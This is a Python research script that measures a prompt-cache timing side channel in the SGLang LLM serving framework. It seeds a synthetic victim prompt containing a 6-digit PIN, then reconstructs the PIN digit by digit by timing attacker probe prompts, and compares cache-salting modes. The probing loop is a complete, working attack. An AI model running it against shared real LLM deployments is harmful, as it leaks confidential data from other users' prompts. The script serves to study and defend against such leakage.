"""
run_level3.py — Level 3 (full PIN reconstruction) for SGLang, KV3.
Mirrors experiments/phase4/run_level3_vllm.py (already validated) for
cross-framework parity. Position-by-position digit inference on a
6-digit PIN, using PIN_LABEL/PIN_SEPARATOR/PIN_TRAILING_MARKER format
from config.py (comma-separated digits prevent BPE merging; trailing
marker prevents last digit from being the literal prompt end).
"""
import csv, os, sys, argparse, random, string
sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
from measure import send_request
from apps.shared_client import resolve_salt, CACHE_MODES

PIN_LENGTH = 6
PIN_LABEL = "PIN: "
PIN_SEPARATOR = ","
PIN_TRAILING_MARKER = "."
FILLER = (
    "You are a customer support assistant for Acme Corp. Always be polite, "
    "concise, and professional. Never disclose internal policy details. "
    "Refer customers to the help center for billing questions. Escalate "
    "any security concerns to the security team immediately. Do not make "
    "promises about refund timelines. Respond only with OK."
)
TEMPLATE = "Confidential authorization code: {pin_str}. " + FILLER

def format_pin(digits):
    return PIN_LABEL + PIN_SEPARATOR.join(digits) + PIN_TRAILING_MARKER

def run(cache_mode, run_id, trials, out_path):
    rows = []
    exact_matches = 0
    total_correct_digits = 0
    print(f"=== SGLang Level 3, cache_mode={cache_mode} ===")
    for trial in range(trials):
        gt_pin = "".join(random.choice(string.digits) for _ in range(PIN_LENGTH))
        salt_v = resolve_salt(cache_mode, "victim", run_id)
        send_request(TEMPLATE.format(pin_str=format_pin(list(gt_pin))), cache_salt=salt_v)

        inferred = []
        for pos in range(PIN_LENGTH):
            latencies = {}
            for d in string.digits:
                digits = list(gt_pin)
                digits[pos] = d
                salt_a = resolve_salt(cache_mode, "attacker", run_id)
                r = send_request(TEMPLATE.format(pin_str=format_pin(digits)), cache_salt=salt_a)
                latencies[d] = r["wall_clock_latency"]
            guess = min(latencies, key=latencies.get)
            inferred.append(guess)
            correct = (guess == gt_pin[pos])
            total_correct_digits += int(correct)
            for d in string.digits:
                rows.append({
                    "framework": "sglang", "cache_mode": cache_mode, "trial": trial,
                    "position": pos, "probe_digit": d, "wall_clock_latency": latencies[d],
                    "ground_truth_digit": gt_pin[pos], "position_guess": guess,
                    "position_correct": correct,
                })
        inferred_pin = "".join(inferred)
        exact = (inferred_pin == gt_pin)
        exact_matches += int(exact)
        print(f"  trial={trial} gt={gt_pin} inferred={inferred_pin} exact_match={exact}")

    os.makedirs(os.path.dirname(out_path), exist_ok=True)
    with open(out_path, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        w.writeheader()
        w.writerows(rows)
    print(f"Saved {len(rows)} rows to {out_path}")
    print(f"Exact-match accuracy: {exact_matches}/{trials} trials")
    print(f"Per-digit accuracy: {total_correct_digits}/{trials*PIN_LENGTH} positions")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--cache-mode", choices=sorted(CACHE_MODES), required=True)
    p.add_argument("--run-id", default=None)
    p.add_argument("--trials", type=int, default=30)
    p.add_argument("--out", required=True)
    a = p.parse_args()
    run(a.cache_mode, a.run_id, a.trials, a.out)
